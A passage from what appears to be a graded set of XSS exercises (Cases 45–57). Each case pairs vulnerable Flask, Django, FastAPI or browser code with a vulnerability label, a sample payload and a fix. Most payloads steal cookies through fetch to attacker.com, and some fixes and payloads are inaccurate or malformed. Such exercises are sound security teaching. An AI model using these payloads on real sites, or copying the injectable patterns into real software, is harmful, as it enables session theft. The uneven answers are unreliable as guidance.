			renderComment({{ comment.author | tojson }}, {{ comment.body | tojson }});
		{% endfor %}
	</script>
</body>
</html>
```

Case 45:

```
# app.py
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/dashboard")
def dashboard():
	username = request.args.get("user", "")
	role = request.args.get("role", "viewer")
	return render_template("dashboard.html", username=username, role=role)
```

```
<!-- dashboard.html -->
<!DOCTYPE html>
<html>
<head>
	<script>
		function initDashboard(username, role) {
			document.getElementById("greeting").textContent =
				"Welcome, " + username + "!";
			document.getElementById("role-badge").textContent = role;
		}
	</script>
</head>
<body>
	<div id="greeting"></div>
	<div id="role-badge"></div>
	<script>
		initDashboard("{{ username }}", "{{ role }}");
	</script>
</body>
</html>
```

1. Reflected XSS. Wrong context escaping. 

2. Below is a sample payload:

```
/?user=") ; fetch('https://attacker.com/?q='+document.cookie);//
```

3. Below is an improvement to the above code--not a fix:


```
# app.py
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/dashboard")
def dashboard():
	username = request.args.get("user", "")
	role = request.args.get("role", "viewer")
	return render_template("dashboard.html", username=username, role=role)
```

```
<!-- dashboard.html -->
<!DOCTYPE html>
<html>
<head>
	<script>
		function initDashboard(username, role) {
			document.getElementById("greeting").textContent =
				"Welcome, " + username + "!";
			document.getElementById("role-badge").textContent = role;
		}
	</script>
</head>
<body>
	<div id="greeting"></div>
	<div id="role-badge"></div>
	<script>
		initDashboard({{ username | tojson }}, {{ role | tojson }});
	</script>
</body>
</html>
```

Case 46:

```
<!DOCTYPE html>
<html>
<body>
	<h1>Live Chat</h1>
	<div id="chat-window"></div>
	<input type="text" id="message-input" placeholder="Type a message..." />
	<button id="send-btn">Send</button>

	<script>
		const chatWindow = document.getElementById("chat-window");
		const input = document.getElementById("message-input");

		document.getElementById("send-btn").addEventListener("click", () => {
			const message = input.value;
			const encoded = encodeURIComponent(message);

			fetch(`/send?msg=${encoded}`)
				.then(res => res.json())
				.then(data => {
					data.messages.forEach(msg => {
						const div = document.createElement("div");
						div.innerHTML = msg.author + ": " + msg.text;
						chatWindow.appendChild(div);
					});
				});

			input.value = "";
		});
	</script>
</body>
</html>
```

1. DOM XSS. Missing escaping.

2. Below is a sample payload:

```
msg.author: ""

msg.text: "<img src=x onerror=\"fetch('https://attacker.com/?q='+document.cookie)\">"
``` 

3. Below is the fix:

```
<!DOCTYPE html>
<html>
<body>
	<h1>Live Chat</h1>
	<div id="chat-window"></div>
	<input type="text" id="message-input" placeholder="Type a message..." />
	<button id="send-btn">Send</button>

	<script>
		const chatWindow = document.getElementById("chat-window");
		const input = document.getElementById("message-input");

		document.getElementById("send-btn").addEventListener("click", () => {
			const message = input.value;
			const encoded = encodeURIComponent(message);

			fetch(`/send?msg=${encoded}`)
				.then(res => res.json())
				.then(data => {
					data.messages.forEach(msg => {
						const div = document.createElement("div");
						div.textContent = `${msg.author}: ${msg.text}`;
						chatWindow.appendChild(div);
					});
				});

			input.value = "";
		});
	</script>
</body>
</html>
```

Case 47:

```
# views.py
import sqlite3
from django.shortcuts import render
from django.utils.html import escape

def get_db():
	conn = sqlite3.connect("products.db")
	conn.row_factory = sqlite3.Row
	return conn

def search(request):
	query = request.GET.get("q", "")
	conn = get_db()
	results = conn.execute(
		"SELECT name, price FROM products WHERE name LIKE ?",
		(f"%{query}%",)
	).fetchall()
	conn.close()
	return render(request, "search.html", {
		"query": escape(query),
		"results": results,
	})
```

```
<!-- search.html -->
<!DOCTYPE html>
<html>
<head>
	<script>
		function trackSearch(term) {
			console.log("User searched for: " + term);
			document.getElementById("search-label").textContent =
				"Showing results for: " + term;
		}
	</script>
</head>
<body>
	<div id="search-label"></div>
	<ul>
		{% for result in results %}
			<li>{{ result.name }} — ${{ result.price }}</li>
		{% endfor %}
	</ul>
	<script>
		trackSearch("{{ query }}");
	</script>
</body>
</html>
```

1. Reflected XSS. Wrong context escaping.

2. Below is a sample payload:

```
?q="); fetch('https://attacker.com/?q='+document.cookie); //
``` 

3. Below is the sample fix:

```
# views.py
import sqlite3
from django.shortcuts import render
from django.utils.html import escape

def get_db():
	conn = sqlite3.connect("products.db")
	conn.row_factory = sqlite3.Row
	return conn

def search(request):
	query = request.GET.get("q", "")
	conn = get_db()
	results = conn.execute(
		"SELECT name, price FROM products WHERE name LIKE ?",
		(f"%{query}%",)
	).fetchall()
	conn.close()
	return render(request, "search.html", {
		"query": query,
		"results": results,
	})
```

```
<!-- search.html -->
<!DOCTYPE html>
<html>
<head>
	<script>
		function trackSearch(term) {
			console.log("User searched for: " + term);
			document.getElementById("search-label").textContent =
				"Showing results for: " + term;
		}
	</script>
</head>
<body>
	<div id="search-label"></div>
	<ul>
		{% for result in results %}
			<li>{{ result.name }} — ${{ result.price }}</li>
		{% endfor %}
	</ul>
	<script>
		trackSearch("{{ query | escapejs }}");
	</script>
</body>
</html>
```

Case 48:

```
# main.py
import sqlite3
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

def get_db():
	conn = sqlite3.connect("news.db")
	conn.row_factory = sqlite3.Row
	return conn

def init_db():
	conn = get_db()
	conn.execute("""
		CREATE TABLE IF NOT EXISTS articles (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			title TEXT NOT NULL,
			summary TEXT NOT NULL,
			author TEXT NOT NULL
		)
	""")
	conn.commit()
	conn.close()

init_db()

@app.post("/article")
async def add_article(request: Request):
	data = await request.json()
	conn = get_db()
	conn.execute(
		"INSERT INTO articles (title, summary, author) VALUES (?, ?, ?)",
		(data.get("title", ""), data.get("summary", ""), data.get("author", ""))
	)
	conn.commit()
	conn.close()
	return {"status": "published"}

@app.get("/news")
async def news_feed(request: Request):
	conn = get_db()
	articles = conn.execute(
		"SELECT title, summary, author FROM articles"
	).fetchall()
	conn.close()
	return templates.TemplateResponse("news.html", {
		"request": request,
		"articles": articles,
	})
```

```
<!-- news.html -->
<!DOCTYPE html>
<html>
<head>
	<script>
		function loadArticle(title, summary, author) {
			const container = document.getElementById("article-view");
			container.innerHTML =
				"<h2>" + title + "</h2>" +
				"<p>" + summary + "</p>" +
				"<small>By " + author + "</small>";
		}
	</script>
</head>
<body>
	<h1>News Feed</h1>
	<div id="article-view"></div>
	<ul>
	{% for article in articles %}
		<li onclick="loadArticle(
			{{ article.title | tojson }},
			{{ article.summary | tojson }},
			{{ article.author | tojson }}
		)">{{ article.title }}</li>
	{% endfor %}
	</ul>
</body>
</html>
```

1. Stored XSS. Missing escaping.
 
2. Below is a sample payload:

```
POST /article
Content-Type: application/json

{
	"title" : "</h2><h2>",

	"summary" : "</p><p>",

	"author" : "attacker</small><img src=x onerror=\"fetch('https://attacker.com/?q='+document.cookie)\"><small>"
}
```
{::comment}
</small>
{:/comment}

3. Below is the fix:

```
# main.py
import sqlite3
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

def get_db():
	conn = sqlite3.connect("news.db")
	conn.row_factory = sqlite3.Row
	return conn

def init_db():
	conn = get_db()
	conn.execute("""
		CREATE TABLE IF NOT EXISTS articles (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			title TEXT NOT NULL,
			summary TEXT NOT NULL,
			author TEXT NOT NULL
		)
	""")
	conn.commit()
	conn.close()

init_db()

@app.post("/article")
async def add_article(request: Request):
	data = await request.json()
	conn = get_db()
	conn.execute(
		"INSERT INTO articles (title, summary, author) VALUES (?, ?, ?)",
		(data.get("title", ""), data.get("summary", ""), data.get("author", ""))
	)
	conn.commit()
	conn.close()
	return {"status": "published"}

@app.get("/news")
async def news_feed(request: Request):
	conn = get_db()
	articles = conn.execute(
		"SELECT title, summary, author FROM articles"
	).fetchall()
	conn.close()
	return templates.TemplateResponse("news.html", {
		"request": request,
		"articles": articles,
	})
```

```
<!-- news.html -->
<!DOCTYPE html>
<html>
<head>
	<script>
		function loadArticle(title, summary, author) {
			const container = document.getElementById("article-view");

			const h2 = document.createElement('h2');

			const p = document.createElement('p');

			const small = document.createElement('small');

			h2.textContent = `${title}`;

			p.textContent = `${summary}`;

			small.textContent = `By ${author}`;
		
			container.appendChild(h2);

			container.appendChild(p);

			container.appendChild(small);
		}
	</script>
</head>
<body>
	<h1>News Feed</h1>
	<div id="article-view"></div>
	<ul>
	{% for article in articles %}
		<li onclick="loadArticle(
			{{ article.title | tojson }},
			{{ article.summary | tojson }},
			{{ article.author | tojson }}
		)">{{ article.title }}</li>
	{% endfor %}
	</ul>
</body>
</html>
```

Case 49:

```
# views.py
import sqlite3
from django.shortcuts import render
from django.utils.html import escape

def get_db():
	conn = sqlite3.connect("notifications.db")
	conn.row_factory = sqlite3.Row
	return conn

def notifications(request):
	user = request.GET.get("user", "")
	conn = get_db()
	rows = conn.execute(
		"SELECT message FROM notifications WHERE username = ?",
		(user,)
	).fetchall()
	conn.close()
	messages = [escape(row["message"]) for row in rows]
	return render(request, "notifications.html", {"messages": messages})
```

```
<!-- notifications.html -->
<!DOCTYPE html>
<html>
<body>
	<h1>Your Notifications</h1>
	<ul>
		{% for msg in messages %}
			<li>{{ msg }}</li>
		{% endfor %}
	</ul>
</body>
</html>
```

1. No vulnerability. Just display issues

2. No relevant payload.

3. Below is the fix:

```
# views.py
import sqlite3
from django.shortcuts import render

def get_db():
	conn = sqlite3.connect("notifications.db")
	conn.row_factory = sqlite3.Row
	return conn

def notifications(request):
	user = request.GET.get("user", "")
	conn = get_db()
	rows = conn.execute(
		"SELECT message FROM notifications WHERE username = ?",
		(user,)
	).fetchall()

	messages = [row['message'] for row in rows]
	conn.close()
	return render(request, "notifications.html", {"messages": messages})
```

```
<!-- notifications.html -->
<!DOCTYPE html>
<html>
<body>
	<h1>Your Notifications</h1>
	<ul>
		{% for msg in messages %}
			<li>{{ msg }}</li>
		{% endfor %}
	</ul>
</body>
</html>
```

Case 50:

```
# app.py
import sqlite3
from flask import Flask, request, render_template

app = Flask(__name__)

def get_db():
	conn = sqlite3.connect("inventory.db")
	conn.row_factory = sqlite3.Row
	return conn

def init_db():
	conn = get_db()
	conn.execute("""
		CREATE TABLE IF NOT EXISTS items (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			name TEXT NOT NULL,
			category TEXT NOT NULL,
			quantity INTEGER NOT NULL
		)
	""")
	conn.commit()
	conn.close()

init_db()

@app.route("/item", methods=["POST"])
def add_item():
	name = request.form.get("name", "")
	category = request.form.get("category", "")
	quantity = request.form.get("quantity", 0)
	conn = get_db()
	conn.execute(
		"INSERT INTO items (name, category, quantity) VALUES (?, ?, ?)",
		(name, category, quantity)
	)
	conn.commit()
	conn.close()
	return "Item added."

@app.route("/inventory")
def inventory():
	category = request.args.get("filter", "")
	conn = get_db()
	if category:
		items = conn.execute(
			"SELECT name, category, quantity FROM items WHERE category = ?",
			(category,)
		).fetchall()
	else:
		items = conn.execute(
			"SELECT name, category, quantity FROM items"
		).fetchall()
	conn.close()
	return render_template("inventory.html", items=items, filter=category)
```

```
<!-- inventory.html -->
<!DOCTYPE html>
<html>
<head>
	<script>
		function applyFilter(category) {
			window.location.href = "/inventory?filter=" + category;
		}
	</script>
</head>
<body>
	<h1>Inventory Dashboard</h1>
	<p>Filtering by: {{ filter }}</p>
	<button onclick="applyFilter('{{ filter }}')">Refresh Filter</button>
	<table>
		<thead><tr><th>Name</th><th>Category</th><th>Quantity</th></tr></thead>
		<tbody>
			{% for item in items %}
				<tr>
					<td>{{ item.name }}</td>
					<td>{{ item.category }}</td>
					<td>{{ item.quantity }}</td>
				</tr>
			{% endfor %}
		</tbody>
	</table>
</body>
</html>
```


1. Reflected XSS. Missing Escaping.

2. Below is a sample payload:

```

/?filter='); fetch('https://attacker.com/?q='+document.cookie)
```

3. Below is a sample fix:


```
# app.py
import sqlite3
from flask import Flask, request, render_template

app = Flask(__name__)

def get_db():
	conn = sqlite3.connect("inventory.db")
	conn.row_factory = sqlite3.Row
	return conn

def init_db():
	conn = get_db()
	conn.execute("""
		CREATE TABLE IF NOT EXISTS items (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			name TEXT NOT NULL,
			category TEXT NOT NULL,
			quantity INTEGER NOT NULL
		)
	""")
	conn.commit()
	conn.close()

init_db()

@app.route("/item", methods=["POST"])
def add_item():
	name = request.form.get("name", "")
	category = request.form.get("category", "")
	quantity = request.form.get("quantity", 0)
	conn = get_db()
	conn.execute(
		"INSERT INTO items (name, category, quantity) VALUES (?, ?, ?)",
		(name, category, quantity)
	)
	conn.commit()
	conn.close()
	return "Item added."

@app.route("/inventory")
def inventory():
	category = request.args.get("filter", "")
	conn = get_db()
	if category:
		items = conn.execute(
			"SELECT name, category, quantity FROM items WHERE category = ?",
			(category,)
		).fetchall()
	else:
		items = conn.execute(
			"SELECT name, category, quantity FROM items"
		).fetchall()
	conn.close()
	return render_template("inventory.html", items=items, filter=category)
```

```
<!-- inventory.html -->
<!DOCTYPE html>
<html>
<head>
	<script>
		function applyFilter(category) {
			window.location.href = "/inventory?filter=" + category;
		}
	</script>
</head>
<body>
	<h1>Inventory Dashboard</h1>
	<p>Filtering by: {{ filter }}</p>
	<button onclick="applyFilter({{ filter | tojson }})">Refresh Filter</button>
	<table>
		<thead><tr><th>Name</th><th>Category</th><th>Quantity</th></tr></thead>
		<tbody>
			{% for item in items %}
				<tr>
					<td>{{ item.name }}</td>
					<td>{{ item.category }}</td>
					<td>{{ item.quantity }}</td>
				</tr>
			{% endfor %}
		</tbody>
	</table>
</body>
</html>
```

Case 51:

```
<!DOCTYPE html>
<html>
<body>
	<h1>Employee Directory</h1>
	<input type="text" id="search" placeholder="Search by name..." />
	<div id="results"></div>

	<script>
		const searchInput = document.getElementById("search");
		const results = document.getElementById("results");

		searchInput.addEventListener("input", () => {
			const query = searchInput.value;

			fetch(`/api/employees?q=${encodeURIComponent(query)}`)
				.then(res => res.json())
				.then(data => {
					results.innerHTML = "";
					data.employees.forEach(emp => {
						const card = document.createElement("div");
						card.setAttribute("data-id", emp.id);
						card.innerHTML =
							`<h3>${emp.name}</h3>` +
							`<p>Role: ${emp.role}</p>` +
							`<p>Email: <a href="mailto:${emp.email}">${emp.email}</a></p>`;
						results.appendChild(card);
					});
				});
		});
	</script>
</body>
</html>
```

1. DOM XSS. Missing escaping.

2. Below is sample payload:

```

{
	"employees": [
		{
			"id": 1,
			"name" : "</h3><img src=x onerror=\"fetch('https://attacker.com/?q='+document.cookie)\"><h3>",
			"role" : "</p><img src=x onerror=\"fetch('https://attacker.com/?q='+document.cookie)\"><p>",
			"email" : "attacker@attacker.com\" onclick=\"fetch('https://attacker.com/?q='+document.cookie)\""
		}
	]
}

```
{::comment}
{</h3>
{:comment}

3.

```
<!DOCTYPE html>
<html>
<body>
	<h1>Employee Directory</h1>
	<input type="text" id="search" placeholder="Search by name..." />
	<div id="results"></div>

	<script>
		const searchInput = document.getElementById("search");
		const results = document.getElementById("results");

		searchInput.addEventListener("input", () => {
			const query = searchInput.value;

			fetch(`/api/employees?q=${encodeURIComponent(query)}`)
				.then(res => res.json())
				.then(data => {
					results.innerHTML = "";
					data.employees.forEach(emp => {

						const card = document.createElement("div");
						card.setAttribute("data-id", emp.id);
						const name = document.createElement('h3');
						name.textContent = `${emp.name}`;
						const role = document.createElement('p');
						role.textContent = `${emp.role}`;
						const email = document.createElement('p');
						email.textContent = `Email: ${emp.email}`;
						card.appendChild(name);
						card.appendChild(role);
						card.appendChild(email);
			
						results.appendChild(card);
					});
				});
		});
	</script>
</body>
</html>
```

Case 52:

```
# app.py
import sqlite3
from flask import Flask, request, render_template

app = Flask(__name__)

def get_db():
	conn = sqlite3.connect("support.db")
	conn.row_factory = sqlite3.Row
	return conn

def init_db():
	conn = get_db()
	conn.execute("""
		CREATE TABLE IF NOT EXISTS tickets (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			subject TEXT NOT NULL,
			message TEXT NOT NULL,
			status TEXT NOT NULL DEFAULT 'open'
		)
	""")
	conn.commit()
	conn.close()

init_db()

@app.route("/ticket", methods=["POST"])
def submit_ticket():
	subject = request.form.get("subject", "")
	message = request.form.get("message", "")
	conn = get_db()
	conn.execute(
		"INSERT INTO tickets (subject, message) VALUES (?, ?)",
		(subject, message)
	)
	conn.commit()
	conn.close()
	return "Ticket submitted."

@app.route("/tickets")
def view_tickets():
	conn = get_db()
	tickets = conn.execute(
		"SELECT id, subject, message, status FROM tickets"
	).fetchall()
	conn.close()
	return render_template("tickets.html", tickets=tickets)
```

```
<!-- tickets.html -->
<!DOCTYPE html>
<html>
<head>
	<script>
		function showTicket(id, subject, message, status) {
			document.getElementById("ticket-id").textContent = id;
			document.getElementById("ticket-subject").innerHTML = subject;
			document.getElementById("ticket-message").innerHTML = message;
			document.getElementById("ticket-status").textContent = status;
		}
	</script>
</head>
<body>
	<h1>Support Tickets</h1>
	<div id="ticket-view">
		<p id="ticket-id"></p>
		<p id="ticket-subject"></p>
		<p id="ticket-message"></p>
		<p id="ticket-status"></p>
	</div>
	<ul>
	{% for ticket in tickets %}
		<li onclick="showTicket(
			{{ ticket.id | tojson }},
			{{ ticket.subject | tojson }},
			{{ ticket.message | tojson }},
			{{ ticket.status | tojson }}
		)">{{ ticket.subject }}</li>
	{% endfor %}
	</ul>
</body>
</html>
```

1. Stored XSS. Missing Escaping.

2. Below is a sample payload for entries in a SQL entry row:

```
id: identification
ticket-subject: <img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
ticket-message: <img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
ticket-status: ticket_status
```

3. Below is the fix:


```
# app.py
import sqlite3
from flask import Flask, request, render_template

app = Flask(__name__)

def get_db():
	conn = sqlite3.connect("support.db")
	conn.row_factory = sqlite3.Row
	return conn

def init_db():
	conn = get_db()
	conn.execute("""
		CREATE TABLE IF NOT EXISTS tickets (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			subject TEXT NOT NULL,
			message TEXT NOT NULL,
			status TEXT NOT NULL DEFAULT 'open'
		)
	""")
	conn.commit()
	conn.close()

init_db()

@app.route("/ticket", methods=["POST"])
def submit_ticket():
	subject = request.form.get("subject", "")
	message = request.form.get("message", "")
	conn = get_db()
	conn.execute(
		"INSERT INTO tickets (subject, message) VALUES (?, ?)",
		(subject, message)
	)
	conn.commit()
	conn.close()
	return "Ticket submitted."

@app.route("/tickets")
def view_tickets():
	conn = get_db()
	tickets = conn.execute(
		"SELECT id, subject, message, status FROM tickets"
	).fetchall()
	conn.close()
	return render_template("tickets.html", tickets=tickets)
```

```
<!-- tickets.html -->
<!DOCTYPE html>
<html>
<head>
	<script>
		function showTicket(id, subject, message, status) {
			document.getElementById("ticket-id").textContent = id;
			document.getElementById("ticket-subject").textContent = subject;
			document.getElementById("ticket-message").textContent = message;
			document.getElementById("ticket-status").textContent = status;
		}
	</script>
</head>
<body>
	<h1>Support Tickets</h1>
	<div id="ticket-view">
		<p id="ticket-id"></p>
		<p id="ticket-subject"></p>
		<p id="ticket-message"></p>
		<p id="ticket-status"></p>
	</div>
	<ul>
	{% for ticket in tickets %}
		<li onclick="showTicket(
			{{ ticket.id | tojson }},
			{{ ticket.subject | tojson }},
			{{ ticket.message | tojson }},
			{{ ticket.status | tojson }}
		)">{{ ticket.subject }}</li>
	{% endfor %}
	</ul>
</body>
</html>
```

Case 53:

```
# main.py
import sqlite3
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates
from markupsafe import escape

app = FastAPI()
templates = Jinja2Templates(directory="templates")

def get_db():
	conn = sqlite3.connect("helpdesk.db")
	conn.row_factory = sqlite3.Row
	return conn

def init_db():
	conn = get_db()
	conn.execute("""
		CREATE TABLE IF NOT EXISTS tickets (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			name TEXT NOT NULL,
			issue TEXT NOT NULL
		)
	""")
	conn.commit()
	conn.close()

init_db()

@app.post("/ticket")
async def submit_ticket(request: Request):
	data = await request.json()
	name = str(escape(data.get("name", "")))
	issue = str(escape(data.get("issue", "")))
	conn = get_db()
	conn.execute(
		"INSERT INTO tickets (name, issue) VALUES (?, ?)",
		(name, issue)
	)
	conn.commit()
	conn.close()
	return {"status": "submitted"}

@app.get("/tickets")
async def view_tickets(request: Request):
	conn = get_db()
	tickets = conn.execute("SELECT name, issue FROM tickets").fetchall()
	conn.close()
	return templates.TemplateResponse("tickets.html", {
		"request": request,
		"tickets": tickets,
	})
```

```
<!-- tickets.html -->
<!DOCTYPE html>
<html>
<body>
	<h1>Help Desk Tickets</h1>
	{% for ticket in tickets %}
		<div class="ticket">
			<strong>{{ ticket.name }}</strong>
			<p>{{ ticket.issue }}</p>
		</div>
	{% endfor %}
</body>
</html>
```

1. There is no XSS bug here. Only display issues.

2. No relevant payload.

3. Below is the fix:


```
# main.py
import sqlite3
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates
from markupsafe import escape

app = FastAPI()
templates = Jinja2Templates(directory="templates")

def get_db():
	conn = sqlite3.connect("helpdesk.db")
	conn.row_factory = sqlite3.Row
	return conn

def init_db():
	conn = get_db()
	conn.execute("""
		CREATE TABLE IF NOT EXISTS tickets (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			name TEXT NOT NULL,
			issue TEXT NOT NULL
		)
	""")
	conn.commit()
	conn.close()

init_db()

@app.post("/ticket")
async def submit_ticket(request: Request):
	data = await request.json()
	name = data.get("name", "")
	issue = data.get("issue", "")
	conn = get_db()
	conn.execute(
		"INSERT INTO tickets (name, issue) VALUES (?, ?)",
		(name, issue)
	)
	conn.commit()
	conn.close()
	return {"status": "submitted"}

@app.get("/tickets")
async def view_tickets(request: Request):
	conn = get_db()
	tickets = conn.execute("SELECT name, issue FROM tickets").fetchall()
	conn.close()
	return templates.TemplateResponse("tickets.html", {
		"request": request,
		"tickets": tickets,
	})
```

```
<!-- tickets.html -->
<!DOCTYPE html>
<html>
<body>
	<h1>Help Desk Tickets</h1>
	{% for ticket in tickets %}
		<div class="ticket">
			<strong>{{ ticket.name }}</strong>
			<p>{{ ticket.issue }}</p>
		</div>
	{% endfor %}
</body>
</html>
```

Case 54:

```
# main.py
import sqlite3
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

def get_db():
	conn = sqlite3.connect("notes.db")
	conn.row_factory = sqlite3.Row
	return conn

def init_db():
	conn = get_db()
	conn.execute("""
		CREATE TABLE IF NOT EXISTS notes (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			title TEXT NOT NULL,
			body TEXT NOT NULL
		)
	""")
	conn.commit()
	conn.close()

init_db()

@app.post("/note")
async def create_note(request: Request):
	data = await request.json()
	title = data.get("title", "")
	body = data.get("body", "")
	conn = get_db()
	conn.execute(
		"INSERT INTO notes (title, body) VALUES (?, ?)",
		(title, body)
	)
	conn.commit()
	conn.close()
	return {"status": "created"}

@app.get("/notes")
async def view_notes(request: Request):
	conn = get_db()
	notes = conn.execute("SELECT id, title, body FROM notes").fetchall()
	conn.close()
	return templates.TemplateResponse("notes.html", {
		"request": request,
		"notes": [dict(n) for n in notes],
	})
```

```
<!-- notes.html -->
<!DOCTYPE html>
<html>
<body>
	<h1>My Notes</h1>
	<div id="note-display"></div>
	<ul>
	{% for note in notes %}
		<li onclick="showNote('{{ note.title }}', '{{ note.body }}')">
			{{ note.title }}
		</li>
	{% endfor %}
	</ul>

	<script>
		function showNote(title, body) {
			document.getElementById("note-display").innerHTML =
				"<h2>" + title + "</h2><p>" + body + "</p>";
		}
	</script>
</body>
</html>
```
1. Stored XSS. Wrong context escaping. Stored XSS in Javascript

string context inside `onclick`. There is also a Stored XSS in

innerHTML DOM sink.

2. Below is a sample payload:

```
note.title: </h2><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)"<h2>
note.body: </p><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)"<p>
```

Below is another payload for `note.title`:

```
note.title:'); fetch('https://attacker.com/?q='+document.cookie);//
```

3. Below is the fix:


```
# main.py
import sqlite3
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

def get_db():
	conn = sqlite3.connect("notes.db")
	conn.row_factory = sqlite3.Row
	return conn

def init_db():
	conn = get_db()
	conn.execute("""
		CREATE TABLE IF NOT EXISTS notes (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			title TEXT NOT NULL,
			body TEXT NOT NULL
		)
	""")
	conn.commit()
	conn.close()

init_db()

@app.post("/note")
async def create_note(request: Request):
	data = await request.json()
	title = data.get("title", "")
	body = data.get("body", "")
	conn = get_db()
	conn.execute(
		"INSERT INTO notes (title, body) VALUES (?, ?)",
		(title, body)
	)
	conn.commit()
	conn.close()
	return {"status": "created"}

@app.get("/notes")
async def view_notes(request: Request):
	conn = get_db()
	notes = conn.execute("SELECT id, title, body FROM notes").fetchall()
	conn.close()
	return templates.TemplateResponse("notes.html", {
		"request": request,
		"notes": [dict(n) for n in notes],
	})
```

```
<!-- notes.html -->
<!DOCTYPE html>
<html>
<body>
	<h1>My Notes</h1>
	<div id="note-display"></div>
	<ul>
	{% for note in notes %}
		<li onclick="showNote({{ note.title | tojson }}, {{ note.body | tojson }})">
			{{ note.title }}
		</li>
	{% endfor %}
	</ul>

	<script>
		function showNote(title, body) {
			
			const notedisplay = document.getElementById("note-display");

			const t = document.createElement('h2');

			t.textContent = title;

			const b= document.createElement('p');

			b.textContent = body;
	
			notedisplay.appendChild(t);

			notedisplay.appendChild(b);
		}
	</script>
</body>
</html>
```

Case 55:

```
# app.py
from flask import Flask, request, render_template
from markupsafe import Markup

app = Flask(__name__)

comments = []

@app.route("/comment", methods=["POST"])
def post_comment():
    author = request.form.get("author", "")
    body = request.form.get("body", "")
    comments.append({
        "author": Markup(author),
        "body": Markup(body),
    })
    return "Comment posted."

@app.route("/comments")
def view_comments():
    return render_template("comments.html", comments=comments)
```

```
<!-- comments.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Comments</h1>
    {% for comment in comments %}
        <div class="comment">
            <strong>{{ comment.author }}</strong>
            <p>{{ comment.body }}</p>
        </div>
    {% endfor %}
</body>
</html>
```

1. Stored XSS. Missing escaping.

2. Below is a sample payload:

```
POST /comment

author=</strong><script>fetch('https://attacker.com/?q='+document.cookie);</script><strong>&body=</p><script>fetch('https://attacker.com/?q='+document.cookie);</script><p>
```
{::comment}
</strong>
{:comment}

3. Below is the fix:


```
# app.py
from flask import Flask, request, render_template
from markupsafe import escape

app = Flask(__name__)

comments = []

@app.route("/comment", methods=["POST"])
def post_comment():
    author = request.form.get("author", "")
    body = request.form.get("body", "")
    comments.append({
        "author": escape(author),
        "body": escape(body),
    })
    return "Comment posted."

@app.route("/comments")
def view_comments():
    return render_template("comments.html", comments=comments)
```

```
<!-- comments.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Comments</h1>
    {% for comment in comments %}
        <div class="comment">
            <strong>{{ comment.author }}</strong>
            <p>{{ comment.body }}</p>
        </div>
    {% endfor %}
</body>
</html>
```

Case 56:

```
# app.py
from flask import Flask, request, render_template
import sqlite3

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect("forum.db")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS posts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            title TEXT NOT NULL,
            body TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()

init_db()

@app.route("/post", methods=["POST"])
def create_post():
    title = request.form.get("title", "")
    body = request.form.get("body", "")
    conn = get_db()
    conn.execute(
        "INSERT INTO posts (title, body) VALUES (?, ?)",
        (title, body)
    )
    conn.commit()
    conn.close()
    return "Post created."

@app.route("/posts")
def view_posts():
    conn = get_db()
    posts = conn.execute("SELECT title, body FROM posts").fetchall()
    conn.close()
    return render_template("posts.html", posts=posts)
```

```
<!-- posts.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Forum Posts</h1>
    {% for post in posts %}
        <div class="post">
            <h2>{{ post.title }}</h2>
            <div class="body">{{ post.body | safe }}</div>
        </div>
    {% endfor %}
</body>
</html>
```

1. Stored XSS. Missing escaping.

2. Below is a sample payload:

```
post.body: </div><script>fetch('https://attacker.com/?q='+document.cookie);</script><div>
```

3. Below is the fix:

```
# app.py
from flask import Flask, request, render_template
import sqlite3

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect("forum.db")
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS posts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            title TEXT NOT NULL,
            body TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()

init_db()

@app.route("/post", methods=["POST"])
def create_post():
    title = request.form.get("title", "")
    body = request.form.get("body", "")
    conn = get_db()
    conn.execute(
        "INSERT INTO posts (title, body) VALUES (?, ?)",
        (title, body)
    )
    conn.commit()
    conn.close()
    return "Post created."

@app.route("/posts")
def view_posts():
    conn = get_db()
    posts = conn.execute("SELECT title, body FROM posts").fetchall()
    conn.close()
    return render_template("posts.html", posts=posts)
```

```
<!-- posts.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Forum Posts</h1>
    {% for post in posts %}
        <div class="post">
            <h2>{{ post.title }}</h2>
            <div class="body">{{ post.body }}</div>
        </div>
    {% endfor %}
</body>
</html>
```
Case 57:

```
# views.py
from django.shortcuts import render
from django.utils.safestring import mark_safe
from .models import Review

def review_list(request):
    reviews = Review.objects.all()
    processed = []
    for review in reviews:
        processed.append({
            "author": mark_safe(review.author),
            "stars": review.stars,
            "body": mark_safe(review.body),
        })
    return render(request, "reviews.html", {"reviews": processed})
```

```
